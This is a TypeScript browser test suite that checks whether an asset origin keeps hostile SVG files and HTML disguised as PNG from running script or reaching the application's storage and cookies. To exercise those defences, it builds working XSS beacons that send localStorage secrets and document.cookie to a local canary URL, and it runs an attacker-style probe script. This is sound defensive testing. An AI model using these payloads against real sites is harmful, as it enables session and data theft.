/**
 * The asset origin in a real browser (SEC-040 criteria 4 and 5; SEC-006 criterion 4; 10 §3.1 "SVG
 * is never rendered as live SVG"). Two origins on this machine: the "application" on 127.0.0.1 and
 * the asset origin on localhost, which a browser treats as different sites. The application page
 * holds a secret in its storage and a cookie; hostile objects are put in the store directly, as if
 * the worker's checks had failed (defence in depth). Every script that runs anywhere reports to a
 * canary on the application's server. Uses Playwright's Chromium (installed for
 * `pnpm test:browsers`) and skips when it is not available.
 */
import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { existsSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import type { Browser, BrowserType } from 'playwright';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { assetKeys } from '../src/keys.ts';
import { MemoryAssetObjects } from '../src/objects.ts';
import { startAssetOrigin, type RunningOrigin } from '../src/origin.ts';
import { PNG, SVG } from '../src/sandbox/types.ts';
import { signAssetUrl } from '../src/signing.ts';
import { enc, png } from './fixtures.ts';

vi.setConfig({ testTimeout: 120_000, hookTimeout: 120_000 });

let chromium: BrowserType | null = null;
try {
  const pw = await import('playwright');
  chromium = existsSync(pw.chromium.executablePath()) ? pw.chromium : null;
} catch {
  chromium = null;
}

const sha = (b: Uint8Array): string => createHash('sha256').update(b).digest('hex');

describe.skipIf(!chromium)('the asset origin in a browser (SEC-040 criteria 4 and 5)', () => {
  const hits: string[] = [];
  let app: Server;
  let appUrl = '';
  let origin: RunningOrigin;
  let assetBase = '';
  let browser: Browser;
  const objects = new MemoryAssetObjects();
  const keys = { current: { id: 'k1', secret: randomBytes(32) } };
  const tenant = randomUUID();

  const beacon = (tag: string): string =>
    `try{new Image().src='CANARY?${tag}&ls='+encodeURIComponent(String(localStorage.getItem('secret')))+'&c='+encodeURIComponent(document.cookie)}catch(e){new Image().src='CANARY?${tag}&error='+e.name}`;

  // Well-formed XML, so that a browser would run it if anything let it.
  const hostileSvg = (): Uint8Array => {
    const attr = beacon('svg-onload').replace(/&/g, '&amp;').replace(/"/g, '&quot;');
    return enc(
      `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" onload="${attr}"><script><![CDATA[${beacon('svg-script')}]]></script><rect width="10" height="10" fill="red"/></svg>`.replaceAll(
        'CANARY',
        `${appUrl}/canary`,
      ),
    );
  };
  const htmlAsPng = (): Uint8Array =>
    enc(
      `<html><body><script>${beacon('html-as-png')}</script></body></html>`.replaceAll(
        'CANARY',
        `${appUrl}/canary`,
      ),
    );
  const image = png(8, 8, { extras: false });
  const urls: Record<string, string> = {};

  beforeAll(async () => {
    app = createServer((req, res) => {
      if (req.url?.startsWith('/canary')) {
        hits.push(req.url);
        res.writeHead(204);
        res.end();
        return;
      }
      if (req.url === '/control.svg') {
        // The control: the same file served without the asset origin's headers.
        res.writeHead(200, { 'Content-Type': SVG });
        res.end(Buffer.from(hostileSvg()));
        return;
      }
      res.writeHead(200, {
        'Content-Type': 'text/html',
        'Set-Cookie': 'session=app-cookie-secret; Path=/; SameSite=Lax',
      });
      res.end(
        '<!doctype html><title>app</title><script>localStorage.setItem("secret", "app-storage-secret")</script>',
      );
    });
    await new Promise<void>((r) => app.listen(0, '127.0.0.1', () => r()));
    appUrl = `http://127.0.0.1:${(app.address() as AddressInfo).port}`;
    origin = await startAssetOrigin({ objects, keys });
    assetBase = origin.url.replace('127.0.0.1', 'localhost');
    const put = async (name: string, bytes: Uint8Array, mime: string) => {
      const h = sha(bytes);
      await objects.put(assetKeys.final(tenant, h), bytes, { contentType: 'text/html' });
      urls[name] = signAssetUrl({
        origin: assetBase,
        tenant,
        sha256: h,
        mime,
        expiresAt: Date.now() + 300_000,
        keys,
      });
    };
    await put('svg', hostileSvg(), SVG);
    await put('htmlAsPng', htmlAsPng(), PNG);
    await put('png', image, PNG);
    browser = await chromium!.launch();
  });

  afterAll(async () => {
    await browser?.close();
    await origin?.close();
    await new Promise<void>((r) => app.close(() => r()));
  });

  it('control: the hostile SVG runs its script when served without these headers', async () => {
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(`${appUrl}/control.svg`);
    await expect.poll(() => hits.length, { timeout: 10_000 }).toBeGreaterThan(0);
    expect(hits.join(' ')).toMatch(/svg-(script|onload)/);
    hits.length = 0;
    await context.close();
  });

  it('embeds images across origins, and runs no script of an SVG or of HTML disguised as an image', async () => {
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(`${appUrl}/app`);
    // Page scripts are strings: this package type-checks against Node.js, not the DOM.
    const loaded = (await page.evaluate(`(async (u) => {
      const load = (src) => new Promise((resolve) => {
        const img = new Image();
        img.onload = () => resolve(img.naturalWidth);
        img.onerror = () => resolve(-1);
        img.src = src;
        document.body.append(img);
      });
      return { png: await load(u.png), svg: await load(u.svg), htmlAsPng: await load(u.htmlAsPng) };
    })(${JSON.stringify(urls)})`)) as { png: number; svg: number; htmlAsPng: number };
    expect(loaded.png).toBe(8); // cross-origin embedding works (Cross-Origin-Resource-Policy: cross-origin)
    expect(loaded.svg).toBe(10); // the SVG shows as a picture, without its script
    expect(loaded.htmlAsPng).toBe(-1); // nosniff: HTML served as image/png is not an image, and not a page
    await page.waitForTimeout(1000);
    expect(hits).toEqual([]);
    await context.close();
  });

  it('does not render an SVG opened directly as a page: it is a download', async () => {
    const context = await browser.newContext({ acceptDownloads: true });
    const page = await context.newPage();
    const download = page.waitForEvent('download', { timeout: 10_000 }).then(
      (d) => d.suggestedFilename(),
      () => null,
    );
    await page.goto(urls['svg']!).catch(() => undefined);
    expect(await download).toMatch(/\.svg$/);
    await page.waitForTimeout(500);
    expect(hits).toEqual([]);
    await context.close();
  });

  it("gives scripts on the asset origin no access to the application origin's storage or cookies", async () => {
    const context = await browser.newContext();
    const app1 = await context.newPage();
    await app1.goto(`${appUrl}/app`);
    expect(await app1.evaluate(`localStorage.getItem('secret')`)).toBe('app-storage-secret');
    expect(await app1.evaluate(`document.cookie`)).toContain('app-cookie-secret');
    // Open the asset origin, then run a script there as an attacker who got one to run would.
    const asset = await context.newPage();
    const res = await asset.goto(urls['htmlAsPng']!);
    expect(res?.headers()['content-type']).toBe(PNG);
    const probe = (await asset.evaluate(`(async (app) => {
      const out = { contentType: document.contentType };
      try { out.storage = String(localStorage.getItem('secret')); } catch (e) { out.storage = 'error:' + e.name; }
      try { out.cookie = document.cookie; } catch (e) { out.cookie = 'error:' + e.name; }
      try { const r = await fetch(app + '/app', { credentials: 'include' }); out.fetch = String(r.status); }
      catch (e) { out.fetch = 'error:' + e.name; }
      return out;
    })(${JSON.stringify(appUrl)})`)) as Record<string, string>;
    // The document is a sandboxed, opaque origin: its storage is unavailable, it has no cookies,
    // and its policy refuses connections. Nothing of the application origin is readable.
    expect(probe['storage']).not.toContain('app-storage-secret');
    expect(probe['cookie'] ?? '').not.toContain('app-cookie-secret');
    expect(probe['fetch']).toMatch(/^error:/);
    expect(hits).toEqual([]);
    await context.close();
  });
});
